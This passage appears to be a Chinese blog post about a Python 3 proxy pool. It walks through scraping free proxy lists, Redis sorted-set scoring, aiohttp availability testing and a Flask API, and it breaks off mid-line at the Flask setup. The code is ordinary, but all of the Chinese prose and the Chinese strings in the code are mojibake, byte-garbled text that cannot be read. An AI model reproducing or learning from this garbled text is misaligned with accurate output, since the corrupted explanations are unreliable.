<p>ä½¿ç”¨Python3çš„åŸå› æ˜¯ç”±äºå¼‚æ­¥IOä½¿ç”¨çš„æ˜¯<code>asyncio</code>å’Œ<code>aiohttp</code>ï¼Œæ‰€ä»¥å°±å­¦ä¹ å°è¯•äº†ä¸‹Python3ï¼Œå…¶å®æ²¡å¤šå¤§åŒºåˆ«æ„Ÿè§‰ã€‚ï¼ˆåˆšå¼€å§‹å­¦ç¼–ç¨‹ï¼ŒåŸè°…æˆ‘å•¥éƒ½ä¸çŸ¥é“ğŸ˜œï¼‰</p>
</li>
<li><p>Flask</p>
<p>ä½¿ç”¨Flaskä½œä¸ºWebå¼€å‘å¾®æ¡†æ¶ï¼Œäº¤ä¸å…¶ä»–Pythonæ¡†æ¶ï¼Œå…·æœ‰ç®€ä¾¿ã€æ˜“æ‰©å±•ç­‰ä¼˜ç‚¹ã€‚å…·ä½“å¯çœ‹ï¼š<a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="external">Flaskä¸­æ–‡æ–‡æ¡£</a></p>
</li>
<li><p>Redis</p>
<p>Redis æ˜¯é€Ÿåº¦éå¸¸å¿«çš„éå…³ç³»å‹ï¼ˆNoSQLï¼‰å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œå¯ä»¥å­˜å‚¨é”®å’Œäº”ç§ä¸åŒç±»å‹çš„å€¼ä¹‹é—´çš„æ˜ å°„ã€‚</p>
<p>äº”ç§ç±»å‹æ•°æ®ç±»å‹ä¸ºï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆã€æ•£åˆ—è¡¨ã€‚æœ¬æ¬¡æ•°æ®å­˜å‚¨æ–¹é¢å°±åˆ©ç”¨çš„redisçš„æœ‰åºé›†åˆã€‚</p>
</li>
<li><p>çˆ¬è™«</p>
<p>çˆ¬è™«éƒ¨åˆ†æ˜¯ä»11ä¸ªå…è´¹ä»£ç†ç½‘ç«™ä¸ŠæŠ“å–å…è´¹ã€é«˜å¯ç”¨æ€§çš„ä»£ç†IPï¼Œå¹¶è¿›è¡Œæ•°æ®å¤„ç†è·å–ç»Ÿä¸€æ ¼å¼ã€‚åŒæ—¶æœ¬ç€å­¦ä¹ çš„ç†å¿µä½¿ç”¨äº†ï¼š<code>lxml</code>ï¼Œ<code>pyquery</code>ï¼Œ<code>æ­£åˆ™</code>ï¼Œ<code>json</code>ç­‰ä¸åŒçš„æŠ€æœ¯æ¥å®ç°ã€‚</p>
</li>
<li><p>å¼‚æ­¥IO</p>
<p>é»˜è®¤ç»™ä»£ç†æ± è®¾ç½®çš„é˜ˆå€¼ä¸º50000ï¼Œç”±äºæ•°é‡æ¯”è¾ƒå¤§ï¼Œä¸ºäº†æé«˜ä»£ç†é«˜å¯ç”¨æ€§çš„æ£€æµ‹æ•ˆç‡ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä½¿ç”¨å¼‚æ­¥è¯·æ±‚åº“aiohttpæ¥è¿›è¡Œæ£€æµ‹ã€‚å…·ä½“å‚è€ƒï¼š<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000" target="_blank" rel="external">å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™-å¼‚æ­¥IO</a></p>
</li>
<li><p>å‰ç«¯</p>
<p>webå‰ç«¯éƒ¨åˆ†æˆ‘æ˜¯çœŸä¸æ‡‚ï¼ˆä½†æ˜¯æˆ‘ä¼šæŠ„å•ŠğŸ˜ï¼‰ï¼Œç›´æ¥wgetçš„ä¸€ä¸ªè‡ªå·±è§‰å¾—æ¯”è¾ƒç®€æ´çš„ç½‘ç«™çš„å‰ç«¯ï¼Œå“ˆå“ˆğŸ˜„ï½</p>
</li>
</ul>
<h2 id="0x02-æ¶æ„éƒ¨åˆ†"><a href="#0x02-æ¶æ„éƒ¨åˆ†" class="headerlink" title="0x02 æ¶æ„éƒ¨åˆ†"></a>0x02 æ¶æ„éƒ¨åˆ†</h2><p> <img src="http://oa8y5guqs.bkt.clouddn.com/jiagou.png" alt=""></p>
<p>ä¸»è¦åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªæ¨¡å—ï¼š</p>
<ul>
<li><p>çˆ¬è™«æ¨¡å—ï¼š</p>
<p>ä¸»è¦ä»11ä¸ªå…è´¹ä»£ç†ç½‘ç«™ä¸ŠæŠ“å–å…è´¹çš„ä»£ç†IPï¼Œå¹¶è¿›è¡Œæ ¼å¼ç»Ÿä¸€å¤„ç†ã€‚åŒæ—¶ä¸ºäº†ä¿è¯ä»£ç†æ± çš„æ¯ç«­ï¼Œé‡‡ç”¨å‘¨æœŸæ€§æŠ“å–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">www.66ip.cn</div><div class="line">www.xdaili.cn</div><div class="line">www.kuaidaili</div><div class="line">www.ip3366.net</div><div class="line">www.89ip.cn</div><div class="line">www.xicidaili.com</div><div class="line">www.iphai.com</div><div class="line">premproxy.com</div><div class="line">www.xroxy.com</div><div class="line">www.data5u.com</div><div class="line">www.kxdaili.com</div></pre></td></tr></table></figure>
</li>
<li><p>å­˜å‚¨æ¨¡å—</p>
<p>ä¸»è¦å­¦ä¹ äº†GitHubä¸Šä¸€ä¸ªé‡‡ç”¨çš„redisçš„æœ‰åºé›†åˆæ¥è¿›è¡Œçš„ï¼Œä¸€æ˜¯ä¿è¯ä»£ç†æ•°æ®çš„ä¸é‡å¤ï¼ŒäºŒæ˜¯ä½¿ç”¨<code>zscore</code>æ¥æ ‡è®°ä»£ç†çš„å¯ç”¨æ€§ã€‚</p>
</li>
<li><p>æ£€æµ‹æ¨¡å—</p>
<p>å®šæ—¶æ£€æµ‹æ•°æ®åº“ä¸­çš„ä»£ç†çš„å¯ç”¨æ€§æƒ…å†µï¼Œå¹¶é‡‡ç”¨æ‰“åˆ†æœºåˆ¶ï¼Œåˆå§‹åŒ–ä¸€ä¸ªåˆ†å€¼ï¼Œè‹¥å¯ç”¨åˆ™æ ‡è®°ä¸ºæœ€é«˜ï¼Œä¸å¯ç”¨åˆ™åœ¨åˆå§‹åŒ–åˆ†å€¼åŸºç¡€ä¸Šå‡1ï¼Œç›´åˆ°ä¸º0ï¼Œåˆ™ä»redisä¸­åˆ é™¤ã€‚åç»­randomè·å–çš„æ—¶å€™é‡‡ç”¨åˆ†å€¼æœ€é«˜çš„ä¼˜å…ˆå±•ç¤ºçš„ä»é«˜åˆ°ä½æ¨¡å¼ã€‚åŒæ—¶ä¿è¯ä»£ç†çš„å®æ—¶å¯ç”¨æ€§ï¼Œè®¾ç½®å®šæ—¶æ£€æµ‹ã€‚</p>
</li>
<li><p>APIæ¨¡å—</p>
<p>é‡‡ç”¨<code>Flask</code>ä½œä¸ºwebæœåŠ¡å™¨ï¼Œå‰ç«¯copyçš„åˆ«äººçš„æ”¹çš„ã€‚ä»redisæ•°æ®åº“ä¸­ä¼˜å…ˆé€‰æ‹©å‡ºåˆ†æ•°æœ€é«˜çš„ï¼Œè‹¥åŒæ—¶å­˜åœ¨å¤šä¸ªï¼Œåˆ™éšæœºé€‰æ‹©ä¸€ä¸ªã€‚</p>
</li>
</ul>
<p>â€‹</p>
<h2 id="0x03-å…·ä½“å®ç°"><a href="#0x03-å…·ä½“å®ç°" class="headerlink" title="0x03 å…·ä½“å®ç°"></a>0x03 å…·ä½“å®ç°</h2><h3 id="çˆ¬è™«æ¨¡å—"><a href="#çˆ¬è™«æ¨¡å—" class="headerlink" title="çˆ¬è™«æ¨¡å—"></a>çˆ¬è™«æ¨¡å—</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">def crawl_daili66(self, page_count=4):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    è·å–ä»£ç†:www.66ip.cn</div><div class="line">    æ–¹æ³•:pyquery</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    start_url = &apos;http://www.66ip.cn/&#123;&#125;.html&apos;</div><div class="line">    urls = [start_url.format(page) for page in range(1, page_count + 1)]</div><div class="line">    for url in urls:</div><div class="line">        html = get_page(url)</div><div class="line">        if html:</div><div class="line">            doc = pq(html)</div><div class="line">            trs = doc(&apos;.containerbox table tr:gt(0)&apos;).items()</div><div class="line">            for tr in trs:</div><div class="line">                ip = tr.find(&apos;td:nth-child(1)&apos;).text()</div><div class="line">                port = tr.find(&apos;td:nth-child(2)&apos;).text()</div><div class="line">                yield &apos;:&apos;.join([ip, port])</div><div class="line"></div><div class="line">def crawl_ip181(self, page_count=2):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    è·å–ä»£ç†:www.xdaili.cn</div><div class="line">    æ–¹æ³•:json</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    start_url = &apos;http://www.xdaili.cn/ipagent//freeip/getFreeIps?page=&#123;&#125;&apos;</div><div class="line">    urls = [start_url.format(page) for page in range(1, page_count + 1)]</div><div class="line">    for url in urls:</div><div class="line">        try:</div><div class="line">            response = requests.get(url)</div><div class="line">            print(&apos;æŠ“å–æˆåŠŸ &gt;&gt;&gt; &apos;, url, response.status_code)</div><div class="line">            if response.status_code == 200:</div><div class="line">                html = response.json()</div><div class="line">        except ConnectionError:</div><div class="line">            print(&apos;æŠ“å–å¤±è´¥ &gt;&gt;&gt; &apos;, url)</div><div class="line">            pass</div><div class="line">        if html:</div><div class="line">            # ip_address = re.compile(r&apos;&quot;ip&quot;:&quot;(.*?)&quot;,&quot;port&quot;:&quot;(.*?)&quot;&apos;)</div><div class="line">            # ip_address = ip_address.findall(html)</div><div class="line">            for key in html[&apos;RESULT&apos;][&apos;rows&apos;]:</div><div class="line">                yield &apos;:&apos;.join([key[&apos;ip&apos;], key[&apos;port&apos;]])</div><div class="line"></div><div class="line">def crawl_kuaidaili(self):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    è·å–ä»£ç†:www.kuaidaili</div><div class="line">    æ–¹æ³•:xpath</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for i in range(1, 4):</div><div class="line">        start_url = &apos;http://www.kuaidaili.com/free/inha/&#123;&#125;/&apos;.format(i)</div><div class="line">        html = get_page(start_url)</div><div class="line">        if html:</div><div class="line">            html = etree.HTML(html, parser=etree.HTMLParser(encoding=&apos;utf-8&apos;))</div><div class="line">            _ip_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[1]/text()&apos;</div><div class="line">            _port_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[2]/text()&apos;</div><div class="line">            for i in range(1, 16):</div><div class="line">                ip_xpath = _ip_xpath.format(i)</div><div class="line">                port_xpath = _port_xpath.format(i)</div><div class="line">                ip = html.xpath(ip_xpath)[0]</div><div class="line">                port = html.xpath(port_xpath)[0]</div><div class="line">                yield &quot;:&quot;.join([ip, port])</div><div class="line"></div><div class="line">def crawl_ip3366(self):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    è·å–ä»£ç†:www.ip3366.net</div><div class="line">    æ–¹æ³•:æ­£åˆ™</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for page in range(1, 4):</div><div class="line">        start_url = &apos;http://www.ip3366.net/free/?stype=1&amp;page=&#123;&#125;&apos;.format(page)</div><div class="line">        html = get_page(start_url)</div><div class="line">        ip_address = re.compile(&apos;&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;&apos;)</div><div class="line">        re_ip_address = ip_address.findall(html)</div><div class="line">        for address, port in re_ip_address:</div><div class="line">            result = address + &apos;:&apos; + port</div><div class="line">            yield result.replace(&apos; &apos;, &apos;&apos;)</div></pre></td></tr></table></figure>
<p>æœ¬ç€å­¦ä¹ çš„ç›®çš„ï¼ŒåŒæ—¶é‡‡ç”¨äº†<code>pyquery</code>ï¼Œ<code>æ­£åˆ™</code>ï¼Œ<code>json</code>ï¼Œ<code>xpath</code>ç­‰ä¸åŒçš„è·å–æ–¹æ³•ï¼Œä½¿ç”¨<code>yield</code>æ¥å°†è¿™äº›æ–¹æ³•å®šä¹‰æˆç”Ÿæˆå™¨ï¼Œè¿™æ ·æˆ‘ä»¬æ¯æ¬¡è¯·æ±‚å°±ä¼šé€šè¿‡<code>yield</code>æ¥è¿”å›ä¸€ä¸ªä»£ç†IPã€‚</p>
<p>åŒæ—¶ä½¿ç”¨<code>crawl_</code>å¼€å¤´çš„å‡½æ•°å‘½åæ–¹æ³•ï¼Œæ¥è¾¾åˆ°åŠ¨æ€æ·»åŠ ä»£ç†ç½‘ç«™åœ°å€æ¥å£çš„ç›®çš„ï¼ˆè¿™éƒ¨åˆ†å€Ÿé‰´çš„å¤§ç¥çš„ï¼‰ï¼Œå…·ä½“å‚è€ƒï¼š<a href="https://blog.csdn.net/permike/article/details/52211721" target="_blank" rel="external">pythonå…ƒç±»è§£æ</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">class ProxyMetaclass(type):</div><div class="line">    def __new__(cls, name, bases, attrs):</div><div class="line">        count = 0</div><div class="line">        attrs[&apos;__CrawlFunc__&apos;] = []</div><div class="line">        for k, v in attrs.items():</div><div class="line">            if &apos;crawl_&apos; in k:</div><div class="line">                attrs[&apos;__CrawlFunc__&apos;].append(k)</div><div class="line">                count += 1</div><div class="line">        attrs[&apos;__CrawlFuncCount__&apos;] = count</div><div class="line">        return type.__new__(cls, name, bases, attrs)</div><div class="line"></div><div class="line"></div><div class="line">class Crawler(object, metaclass=ProxyMetaclass):</div><div class="line">    def get_proxies(self, callback):</div><div class="line">        proxies = []</div><div class="line">        for proxy in eval(&quot;self.&#123;&#125;()&quot;.format(callback)):</div><div class="line">            print(u&apos;æˆåŠŸè·å–åˆ°ä»£ç† &gt;&gt;&gt; &apos;, proxy)</div><div class="line">            proxies.append(proxy)</div><div class="line">        return proxies</div></pre></td></tr></table></figure>
<p>å®šä¹‰ç±»ProxyMetaclasså¹¶å£°æ˜ä¸€ä¸ª<code>__new__</code>æ–¹æ³•ï¼ŒåŒæ—¶Crawlerç±»å°†å®ƒå£°æ˜ä¸ºå…ƒç±»ï¼Œè¿™ä¸ªæ–¹æ³•æœ‰å›ºå®šçš„å‡ ä¸ªå‚æ•°<code>cls, name, bases, attrs</code>ï¼Œç¬¬å››ä¸ªå‚æ•°<code>attrs</code>ä¸­åŒ…å«äº†ç±»çš„ä¸€äº›å±æ€§ã€‚æˆ‘ä»¬å¯ä»¥éå†<code>attrs</code>è¿™ä¸ªå‚æ•°å³å¯è·å–ç±»çš„æ‰€æœ‰æ–¹æ³•ä¿¡æ¯ï¼Œå°±åƒéå†å­—å…¸ä¸€æ ·ï¼Œé”®åå¯¹åº”æ–¹æ³•çš„åç§°ã€‚ç„¶ååˆ¤æ–­æ–¹æ³•çš„å¼€å¤´æ˜¯å¦<code>crawl_</code>ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°†å…¶åŠ å…¥åˆ°<code>__CrawlFunc__</code>å±æ€§ä¸­ã€‚è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸå°†æ‰€æœ‰ä»¥<code>crawl_</code>å¼€å¤´çš„æ–¹æ³•å®šä¹‰æˆäº†ä¸€ä¸ªå±æ€§ï¼ŒåŠ¨æ€è·å–åˆ°æ‰€æœ‰ä»¥<code>crawl_</code>å¼€å¤´çš„æ–¹æ³•åˆ—è¡¨ã€‚</p>
<p>ç„¶åå®šä¹‰äº†ä¸€ä¸ª<code>get_proxies()</code>æ–¹æ³•ï¼Œå°†æ‰€æœ‰ä»¥<code>crawl_</code>å¼€å¤´çš„æ–¹æ³•è°ƒç”¨ä¸€éï¼Œè·å–æ¯ä¸ªæ–¹æ³•è¿”å›çš„ä»£ç†å¹¶ç»„åˆæˆåˆ—è¡¨å½¢å¼è¿”å›ã€‚</p>
<h3 id="å­˜å‚¨æ¨¡å—"><a href="#å­˜å‚¨æ¨¡å—" class="headerlink" title="å­˜å‚¨æ¨¡å—"></a>å­˜å‚¨æ¨¡å—</h3><p>é‡‡ç”¨redisçš„æœ‰åºé›†åˆï¼Œé›†åˆçš„ç‰¹ç‚¹æ˜¯é›†åˆçš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ä¸é‡å¤çš„ï¼Œè¿™æ ·å°±ä¿è¯äº†ä»£ç†çš„ä¸é‡å¤ã€‚æœ‰åºé›†åˆï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™é‡Œå­˜å‚¨çš„æ•°æ®æ˜¯æœ‰åºçš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç‚¹å¯¹ä»£ç†IPè¿›è¡Œæ‰“åˆ†ã€æ’åºï¼Œå®ç°æƒé‡çš„æ•ˆæœã€‚å…·ä½“å¯å‚è€ƒï¼š<a href="http://www.runoob.com/redis/redis-sorted-sets.html" target="_blank" rel="external">Redis æœ‰åºé›†åˆ(sorted set)</a></p>
<p>è¿æ¥redis</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=True)</div></pre></td></tr></table></figure>
<p>æ·»åŠ æ•°æ®ï¼Œæ·»åŠ ä»£ç†ï¼Œè®¾ç½®åˆ†æ•°ä¸ºæœ€é«˜</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def add(self, proxy, score=INITIAL_SCORE):</div><div class="line">    if not re.match(&apos;\d+\.\d+\.\d+\.\d+\:\d+&apos;, proxy):</div><div class="line">        print(&apos;ä»£ç†ä¸ç¬¦åˆè§„èŒƒ&apos;, proxy, u&apos;ä¸¢å¼ƒ&apos;)</div><div class="line">        return</div><div class="line">    if not self.db.zscore(REDIS_KEY, proxy):</div><div class="line">        return self.db.zadd(REDIS_KEY, score, proxy)</div></pre></td></tr></table></figure>
<p>è·å–ä»£ç†IPï¼Œéšæœºè·å–æœ‰æ•ˆä»£ç†ï¼Œé¦–å…ˆå°è¯•è·å–æœ€é«˜åˆ†æ•°ä»£ç†ï¼Œå¦‚æœä¸å­˜åœ¨ï¼ŒæŒ‰ç…§æ’åè·å–ï¼Œå¦åˆ™å¼‚å¸¸</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def random(self):</div><div class="line">    result = self.db.zrangebyscore(REDIS_KEY, MAX_SCORE, MAX_SCORE)</div><div class="line">    if len(result):</div><div class="line">        return choice(result)</div><div class="line">    else:</div><div class="line">        result = self.db.zrevrange(REDIS_KEY, 0, 100)</div><div class="line">        if len(result):</div><div class="line">            return choice(result)</div><div class="line">        else:</div><div class="line">            raise PoolEmptyError</div></pre></td></tr></table></figure>
<p>åˆ é™¤ä»£ç†IPï¼Œä»£ç†å€¼å‡ä¸€åˆ†ï¼Œå°äºæœ€å°å€¼åˆ™åˆ é™¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def decrease(self, proxy):</div><div class="line">    score = self.db.zscore(REDIS_KEY, proxy)</div><div class="line">    if score and score &gt; MIN_SCORE:</div><div class="line">        print(&apos;ä»£ç†&apos;, proxy, u&apos;å½“å‰åˆ†æ•°&apos;, score, u&apos;å‡1&apos;)</div><div class="line">        return self.db.zincrby(REDIS_KEY, proxy, -1)</div><div class="line">    else:</div><div class="line">        print(&apos;ä»£ç†&apos;, proxy, u&apos;å½“å‰åˆ†æ•°&apos;, score, &apos;ç§»é™¤&apos;)</div><div class="line">        return self.db.zrem(REDIS_KEY, proxy)</div></pre></td></tr></table></figure>
<h3 id="æ£€æµ‹æ¨¡å—"><a href="#æ£€æµ‹æ¨¡å—" class="headerlink" title="æ£€æµ‹æ¨¡å—"></a>æ£€æµ‹æ¨¡å—</h3><p>ä»£ç†æ£€æµ‹ç¬¬ä¸€æ¬¡å¯ç”¨ï¼Œåˆ™åˆ†æ•°è®¾ç½®ä¸º100ï¼Œä»£ç†ä¸å¯ç”¨ï¼Œåˆ†æ•°å‡1ï¼Œè¿™æ ·å°±å¯ä»¥å®æ—¶æ”¹å˜æ¯ä¸ªä»£ç†çš„å¯ç”¨æƒ…å†µã€‚APIæ¥å£è¿”å›çš„æ—¶å€™åªéœ€è¦è·å–åˆ†æ•°é«˜çš„ä»£ç†å³å¯ã€‚ä½¿ç”¨çš„python3çš„å¼‚æ­¥IOåº“<code>aiohttp</code>ï¼Œå‚è€ƒçš„å¤§ç¥çš„è¡¨æ¼”ï¼Œå­¦ä¹ äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">class Tester(object):</div><div class="line">    def __init__(self):</div><div class="line">        self.redis = RedisClient()</div><div class="line"></div><div class="line">    async def test_single_proxy(self, proxy):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        å¼‚æ­¥æµ‹è¯•å•ä¸ªä»£ç†IPå¹¶å†™å…¥redis</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        conn = aiohttp.TCPConnector(verify_ssl=False)</div><div class="line">        async with aiohttp.ClientSession(connector=conn) as session:</div><div class="line">            try:</div><div class="line">                if isinstance(proxy, bytes):</div><div class="line">                    proxy = proxy.decode(&apos;utf-8&apos;)</div><div class="line">                real_proxy = &apos;http://&apos; + proxy</div><div class="line">                print(&apos;æ­£åœ¨æµ‹è¯• &gt;&gt;&gt;&apos;, proxy)</div><div class="line">                async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response:</div><div class="line">                    if response.status in VALID_STATUS_CODES:</div><div class="line">                        self.redis.max(proxy)</div><div class="line">                        print(&apos;ä»£ç†å¯ç”¨ &gt;&gt;&gt; &apos;, proxy)</div><div class="line">                    else:</div><div class="line">                        self.redis.decrease(proxy)</div><div class="line">                        print(&apos;è¯·æ±‚å“åº”ç ä¸åˆæ³• &gt;&gt;&gt;&apos;, response.status, &apos;IP&apos;, proxy)</div><div class="line">            except Exception as e:</div><div class="line">                self.redis.decrease(proxy)</div><div class="line">                print(&apos;ä»£ç†è¯·æ±‚å¤±è´¥ &gt;&gt;&gt; &apos;, proxy)</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        æµ‹è¯•ä¸»å‡½æ•°</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        print(&apos;*** æµ‹è¯•å™¨å¼€å§‹è¿è¡Œ ***&apos;)</div><div class="line">        try:</div><div class="line">            count = self.redis.count()</div><div class="line">            print(&apos;å½“å‰å‰©ä½™ï¼š&apos;, count, u&apos;ä¸ªä»£ç†&apos;)</div><div class="line">            for i in range(0, count, BATCH_TEST_SIZE):</div><div class="line">                start = i</div><div class="line">                stop = min(i + BATCH_TEST_SIZE, count)</div><div class="line">                print(&apos;æ­£åœ¨æµ‹è¯•ç¬¬&apos;, start + 1, &apos;-&apos;, stop, u&apos;ä¸ªä»£ç†&apos;)</div><div class="line">                test_proxies = self.redis.batch(start, stop)</div><div class="line">                loop = asyncio.get_event_loop()</div><div class="line">                tasks = [self.test_single_proxy(proxy) for proxy in test_proxies]</div><div class="line">                loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">                sys.stdout.flush()</div><div class="line">                time.sleep(5)</div><div class="line">        except Exception as e:</div><div class="line">            print(&apos;æµ‹è¯•å™¨å‘ç”Ÿé”™è¯¯&apos;, e.args)</div></pre></td></tr></table></figure>
<p>å®šä¹‰äº†ä¸€ä¸ªç±»<code>Tester</code>ï¼Œæ¥ä¸‹æ¥å®šä¹‰äº†ä¸€ä¸ª<code>test_single_proxy()</code>æ–¹æ³•ï¼Œå¹¶åœ¨å‰é¢åŠ äº†<code>async</code>å…³é”®è¯ï¼Œè¿™ä»£è¡¨è¿™ä¸ªæ–¹æ³•æ˜¯å¼‚æ­¥çš„ã€‚æ–¹æ³•å†…éƒ¨é¦–å…ˆåˆ›å»ºäº†aiohttpçš„<code>ClientSession</code>å¯¹è±¡ï¼Œæ­¤å¯¹è±¡ç±»ä¼¼äºrequestsçš„<code>Session</code>å¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨è¯¥å¯¹è±¡çš„get()æ–¹æ³•æ¥è®¿é—®é¡µé¢ã€‚åœ¨è¿™é‡Œï¼Œä»£ç†çš„è®¾ç½®æ˜¯é€šè¿‡<code>proxy</code>å‚æ•°ä¼ é€’ç»™<code>get()</code>æ–¹æ³•ï¼Œç¨‹åºåœ¨è·å–Responseåéœ€è¦åˆ¤æ–­å“åº”çš„çŠ¶æ€ï¼Œå¦‚æœçŠ¶æ€ç åœ¨<code>VALID_STATUS_CODES</code>åˆ—è¡¨é‡Œï¼Œåˆ™ä»£è¡¨ä»£ç†å¯ç”¨ï¼Œå¯ä»¥è°ƒç”¨<code>RedisClient</code>çš„<code>max()</code>æ–¹æ³•å°†ä»£ç†åˆ†æ•°è®¾ä¸º100ï¼Œå¦åˆ™è°ƒç”¨<code>decrease()</code>æ–¹æ³•å°†ä»£ç†åˆ†æ•°å‡1ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸ä¹ŸåŒæ ·å°†ä»£ç†åˆ†æ•°å‡1ã€‚</p>
<h2 id="0x04-æ¥å£æ¨¡å—"><a href="#0x04-æ¥å£æ¨¡å—" class="headerlink" title="0x04 æ¥å£æ¨¡å—"></a>0x04 æ¥å£æ¨¡å—</h2><p>ä½¿ç”¨Flaskå®ç°æ¥å£æ¨¡å—ï¼Œå‰ç«¯wgetçš„<a href="http://vulapps.evalbug.com/about/" target="_blank" rel="external">VulAppsçš„å‰ç«¯æ¨¡ç‰ˆ</a>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">__all__ = [&apos;app&apos;]</div><div class="line">app = 